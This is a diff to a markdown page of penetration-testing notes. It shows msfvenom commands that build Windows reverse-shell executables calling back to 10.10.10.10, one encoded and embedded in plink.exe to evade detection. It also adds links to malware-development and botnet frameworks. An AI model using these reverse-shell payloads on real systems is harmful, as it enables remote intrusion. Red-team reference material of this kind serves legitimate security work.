@@ -59,3 +59,14 @@ msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -f exe 
 ## Windows reverse shell embedded into plink
 
 msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata\_ga\_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell\_reverse\_msf\_encoded\_embedded.exe
+
+## Payload and Malware Development References
+
+These are offensive development references. They were moved here from DFIR so the malware-analysis page can stay focused on defensive analysis.
+
+* [0xPat](https://0xpat.github.io/) - Red/purple team blog with malware development write-ups.
+* [Malware Development Part 1](https://0xpat.github.io/Malware_development_part_1/)
+* [Malware Development Part 2](https://0xpat.github.io/Malware_development_part_2/)
+* [Coldfire](https://github.com/redcode-labs/Coldfire) - Golang malware development framework.
+* [BYOB](https://github.com/malwaredllc/byob) - Open-source post-exploitation/botnet framework for research and training.
+  * [BYOB in Action](https://perception-point.io/resources/research/byob-build-your-own-botnet-in-action/)
